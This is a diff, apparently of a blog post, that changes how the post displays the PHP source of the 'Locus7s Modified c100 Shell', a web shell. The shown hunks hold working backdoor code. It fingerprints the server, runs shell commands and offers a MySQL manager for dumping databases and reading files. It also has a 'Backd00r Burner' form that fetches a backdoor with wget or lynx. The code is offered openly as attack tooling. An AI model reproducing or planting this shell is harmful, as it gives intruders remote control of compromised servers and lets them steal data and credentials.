@@ -23,7 +23,7 @@ Anyway, here is the
 
 ### Locus7s Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 /******************************************************************************************
 *  Locus7s Modified c100 Shell                                                                 
 *  Beta v. 1.0a - Project x2300                                                                   
@@ -1183,7 +1183,7 @@ if (!is_array($actbox)) {$actbox = array();}
 $dspact = $act = htmlspecialchars($act);
 $disp_fullpath = $ls_arr = $notls = null;
 $ud = urlencode($d);
-?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;&lt;meta http-equiv="Content-Language" content="en-us"&gt;&lt;title&gt;&lt;?php echo getenv("HTTP_HOST"); ?&gt; - Locus7Shell&lt;/title&gt;&lt;STYLE&gt;TD { FONT-SIZE: 8pt; COLOR: #009900; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #009900; scrollbar-shadow-color: #000000; scrollbar-highlight-color: #00CC00; scrollbar-3dlight-color: #00CC00; scrollbar-darkshadow-color: #009900; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #000000; COLOR: green; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #009900; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #f89521; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #f89521; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #f89521; TEXT-DECORATION: none;}A:hover { COLOR: #f89521; TEXT-DECORATION: bold;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #009900; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #009900;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}&lt;/style&gt;&lt;/head&gt;&lt;BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&gt;&lt;center&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"&gt;&lt;p&gt;&lt;center&gt;&lt;img src="http://img244.imageshack.us/img244/6663/locus7sgm8.jpg"&gt;&lt;/p&gt;&lt;/center&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p align="left"&gt;&lt;b&gt;Software:&nbsp;&lt;?php echo $DISP_SERVER_SOFTWARE; ?&gt;&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;uname -a:&nbsp;&lt;?php echo wordwrap(php_uname(),90,"&lt;br&gt;",1); ?&gt;&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;&lt;?php if (!$win) {echo wordwrap(myshellexec("id"),90,"&lt;br&gt;",1);} else {echo get_current_user();} ?&gt;&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;Safe-mode:&nbsp;&lt;?php echo $hsafemode; ?&gt;&lt;/b&gt;&lt;/p&gt;&lt;p align="left"&gt;&lt;?php
+?>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;&lt;meta http-equiv="Content-Language" content="en-us"&gt;&lt;title&gt;<?php echo getenv("HTTP_HOST"); ?> - Locus7Shell&lt;/title&gt;&lt;STYLE&gt;TD { FONT-SIZE: 8pt; COLOR: #009900; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #009900; scrollbar-shadow-color: #000000; scrollbar-highlight-color: #00CC00; scrollbar-3dlight-color: #00CC00; scrollbar-darkshadow-color: #009900; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #000000; COLOR: green; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #009900; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #f89521; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #f89521; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #f89521; TEXT-DECORATION: none;}A:hover { COLOR: #f89521; TEXT-DECORATION: bold;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #009900; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #009900;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}&lt;/style&gt;&lt;/head&gt;&lt;BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&gt;&lt;center&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"&gt;&lt;p&gt;&lt;center&gt;&lt;img src="http://img244.imageshack.us/img244/6663/locus7sgm8.jpg"&gt;&lt;/p&gt;&lt;/center&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p align="left"&gt;&lt;b&gt;Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"&lt;br&gt;",1); ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;<?php if (!$win) {echo wordwrap(myshellexec("id"),90,"&lt;br&gt;",1);} else {echo get_current_user();} ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;Safe-mode:&nbsp;<?php echo $hsafemode; ?>&lt;/b&gt;&lt;/p&gt;&lt;p align="left"&gt;<?php
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
@@ -1276,7 +1276,7 @@ if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
 if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
 if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
 $sql_surl .= "&";
-?&gt;&lt;h3&gt;Attention! SQL-Manager is &lt;u&gt;NOT&lt;/u&gt; ready module! Don't reports bugs.&lt;/h3&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;td width="100%" height="1" colspan="2" valign="top"&gt;&lt;center&gt;&lt;?php
+?>&lt;h3&gt;Attention! SQL-Manager is &lt;u&gt;NOT&lt;/u&gt; ready module! Don't reports bugs.&lt;/h3&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;td width="100%" height="1" colspan="2" valign="top"&gt;&lt;center&gt;<?php
 if ($sql_server)
 {
   $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
@@ -1305,13 +1305,13 @@ else
   echo "&lt;/center&gt;";
 }
 echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;";
-if (!$sql_sock) {?&gt;&lt;td width="28%" height="100" valign="top"&gt;&lt;center&gt;&lt;font size="5"&gt; i &lt;/font&gt;&lt;/center&gt;&lt;li&gt;If login is null, login is owner of process.&lt;li&gt;If host is null, host is localhost&lt;/b&gt;&lt;li&gt;If port is null, port is 3306 (default)&lt;/td&gt;&lt;td width="90%" height="1" valign="top"&gt;&lt;TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;b&gt;Please, fill the form:&lt;/b&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Username&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Password&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Database&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;form action="&lt;?php echo $surl; ?&gt;" method="POST"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;tr&gt;&lt;td&gt;&lt;input type="text" name="sql_login" value="root" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="password" name="sql_passwd" value="" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_db" value="" maxlength="64"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Host&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;PORT&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=right&gt;&lt;input type="text" name="sql_server" value="localhost" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_port" value="3306" maxlength="6" size="3"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="submit" value="Connect"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;&lt;?php }
+if (!$sql_sock) {?>&lt;td width="28%" height="100" valign="top"&gt;&lt;center&gt;&lt;font size="5"&gt; i &lt;/font&gt;&lt;/center&gt;&lt;li&gt;If login is null, login is owner of process.&lt;li&gt;If host is null, host is localhost&lt;/b&gt;&lt;li&gt;If port is null, port is 3306 (default)&lt;/td&gt;&lt;td width="90%" height="1" valign="top"&gt;&lt;TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;b&gt;Please, fill the form:&lt;/b&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Username&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Password&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Database&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;form action="<?php echo $surl; ?>" method="POST"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;tr&gt;&lt;td&gt;&lt;input type="text" name="sql_login" value="root" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="password" name="sql_passwd" value="" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_db" value="" maxlength="64"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Host&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;PORT&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=right&gt;&lt;input type="text" name="sql_server" value="localhost" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_port" value="3306" maxlength="6" size="3"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="submit" value="Connect"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;<?php }
 else
 {
   //Start left panel
   if (!empty($sql_db))
   {
-   ?&gt;&lt;td width="25%" height="100%" valign="top"&gt;&lt;a href="&lt;?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?&gt;"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;&lt;?php
+   ?>&lt;td width="25%" height="100%" valign="top"&gt;&lt;a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;<?php
    $result = mysql_list_tables($sql_db);
    if (!$result) {echo mysql_smarterror();}
    else
@@ -1324,19 +1324,19 @@ else
   }
   else
   {
-   ?&gt;&lt;td width="1" height="100" valign="top"&gt;&lt;a href="&lt;?php echo $sql_surl; ?&gt;"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;&lt;?php
+   ?>&lt;td width="1" height="100" valign="top"&gt;&lt;a href="<?php echo $sql_surl; ?>"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;<?php
    $result = mysql_list_dbs($sql_sock);
    if (!$result) {echo mysql_smarterror();}
    else
    {
-    ?&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;select name="sql_db"&gt;&lt;?php
+    ?>&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;select name="sql_db"&gt;<?php
     $c = 0;
     $dbs = "";
     while ($row = mysql_fetch_row($result)) {$dbs .= "&lt;option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= "&gt;".$row[0]."&lt;/option&gt;"; $c++;}
     echo "&lt;option value=\"\"&gt;Databases (".$c.")&lt;/option&gt;";
     echo $dbs;
    }
-   ?&gt;&lt;/select&gt;&lt;hr size="1" noshade&gt;Please, select database&lt;hr size="1" noshade&gt;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;&lt;?php
+   ?>&lt;/select&gt;&lt;hr size="1" noshade&gt;Please, select database&lt;hr size="1" noshade&gt;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;<?php
   }
   //End left panel
   echo "&lt;/td&gt;&lt;td width=\"100%\" height=\"1\" valign=\"top\"&gt;";
@@ -1393,7 +1393,7 @@ else
    }
    if (in_array($sql_act,$acts))
    {
-    ?&gt;&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new table:&lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newtbl"&gt;&lt;input type="hidden" name="sql_db" value="&lt;?php echo htmlspecialchars($sql_db); ?&gt;"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="sql_newtbl" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Dump DB:&lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="dump"&gt;&lt;input type="hidden" name="sql_db" value="&lt;?php echo htmlspecialchars($sql_db); ?&gt;"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="dump_file" size="30" value="&lt;?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?&gt;"&gt;&nbsp;&lt;input type="submit" name=\"submit\" value="Dump"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;?php
+    ?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new table:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newtbl"&gt;&lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_newtbl" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Dump DB:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="dump"&gt;&lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>"&gt;&nbsp;&lt;input type="submit" name=\"submit\" value="Dump"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<?php
     if (!empty($sql_act)) {echo "&lt;hr size=\"1\" noshade&gt;";}
     if ($sql_act == "newtbl")
     {
@@ -1641,7 +1641,7 @@ else
   else
   {
    $acts = array("","newdb","serverstatus","servervars","processes","getfile");
-   if (in_array($sql_act,$acts)) {?&gt;&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new DB:&lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newdb"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="sql_newdb" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;View File:&lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="getfile"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="sql_getfile" size="30" value="&lt;?php echo htmlspecialchars($sql_getfile); ?&gt;"&gt;&nbsp;&lt;input type="submit" value="Get"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;?php }
+   if (in_array($sql_act,$acts)) {?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new DB:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newdb"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_newdb" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;View File:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="getfile"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>"&gt;&nbsp;&lt;input type="submit" value="Get"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<?php }
    if (!empty($sql_act))
    {
     echo "&lt;hr size=\"1\" noshade&gt;";
@@ -2441,36 +2441,36 @@ else
 }
 if ($act == "tools")
 {
-?&gt;
+?>
 
 
 &lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="&lt;?php echo $surl; ?&gt;act=cmd&d=&lt;?php echo urlencode($d); ?&gt;"&gt;&lt;b&gt;Bind Functions By r57  &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"&gt;&lt;b&gt;Bind Functions By r57  &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
     &lt;div align="center"&gt;
     &lt;/div&gt;
-&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;
-&lt;b&gt;Bind With Backd00r Burner&lt;/b&gt;&lt;/br&gt;&lt;form action="&lt;?php echo $surl;?&gt;"&gt;&lt;input type=hidden name=act value=tools&gt;&lt;select size=\"1\" name=dolma&gt;&lt;option value="wgetcan"&gt;Use Wget&lt;/option&gt;&lt;option value="lynxcan"&gt;Use lynx -dump&lt;/option&gt;&lt;option value="freadcan"&gt;Use Fread&lt;/option&gt;&lt;/select&gt;&lt;/br&gt;&lt;/br&gt;&lt;input type="submit" value="Burn it bAby"&gt;&lt;/form&gt;
+&lt;form action="<?php echo $surl; ?>"&gt;
+&lt;b&gt;Bind With Backd00r Burner&lt;/b&gt;&lt;/br&gt;&lt;form action="<?php echo $surl;?>"&gt;&lt;input type=hidden name=act value=tools&gt;&lt;select size=\"1\" name=dolma&gt;&lt;option value="wgetcan"&gt;Use Wget&lt;/option&gt;&lt;option value="lynxcan"&gt;Use lynx -dump&lt;/option&gt;&lt;option value="freadcan"&gt;Use Fread&lt;/option&gt;&lt;/select&gt;&lt;/br&gt;&lt;/br&gt;&lt;input type="submit" value="Burn it bAby"&gt;&lt;/form&gt;
     &lt;/td&gt;
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
    &lt;center&gt;
   
